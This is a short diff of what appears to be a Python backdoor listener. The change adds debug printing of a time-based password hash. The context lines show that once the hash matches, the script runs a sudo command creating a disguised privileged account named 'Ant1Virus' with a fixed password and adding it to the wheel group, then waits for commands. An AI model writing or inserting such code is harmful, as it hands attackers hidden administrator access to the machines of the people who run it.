@@ -24,8 +24,11 @@ while True:
         time = res.read().strip().decode('utf-8')
         print("time: " + time)
         pwd = conn.recv(4096).decode()
+        expected_hash = str(hash("haxor" + time))
+        print("Received hash: " + pwd)
+        print("Expected hash: " + expected_hash)
         # Check the hash
-        if pwd == str(hash("haxor" + time)):
+        if pwd == expected_hash:
             print("Correct password, waiting for commands")
             conn.send("done".encode())
             subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus && sudo usermod -aG wheel Ant1Virus", shell=True)
